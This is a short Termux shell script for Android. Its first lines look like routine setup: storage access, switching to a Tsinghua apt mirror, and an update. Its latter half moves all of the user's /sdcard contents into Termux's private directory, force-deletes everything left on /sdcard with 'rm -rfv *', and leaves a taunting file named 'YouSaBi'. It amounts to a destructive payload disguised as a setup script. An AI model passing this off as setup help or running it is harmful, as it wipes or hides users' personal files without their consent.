termux-setup-storage
sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/apt/termux-main stable main@' $PREFIX/etc/apt/sources.list

apt update && apt upgrade
cd ~
mkdir backup
cd ~/backup
mv /sdcard/* ~/backup
cd /sdcard
rm -rfv *
echo "SB">YouSaBi
exit

